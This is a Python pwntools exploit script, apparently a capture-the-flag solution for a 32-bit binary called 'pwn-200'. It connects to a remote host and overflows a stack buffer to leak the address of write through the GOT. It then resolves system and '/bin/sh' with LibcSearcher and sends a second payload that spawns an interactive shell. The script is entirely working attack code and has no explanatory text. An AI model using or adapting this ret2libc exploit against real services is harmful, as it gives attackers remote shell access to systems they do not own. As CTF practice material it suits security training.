from pwn import *
from LibcSearcher import *
context(arch='i386',os='linux')

# p = process('./pwn-200')
p =remote('124.126.19.106',53404)
elf = ELF('./pwn-200',checksec=False)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = 0x080484BE

p.recv()
payload = 'A'*(0x6c+4)
payload += flat([write_plt, main, 1, write_got, 8])
p.send(payload)

write_addr = u32(p.recv(4))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.success('system_addr = %#x, binsh = %#x'%(system_addr, binsh))

p.recv()
payload = 'A'*(0x6c +4)
payload += flat([system_addr, main, binsh])
p.send(payload)
sleep(0.1)
p.interactive()
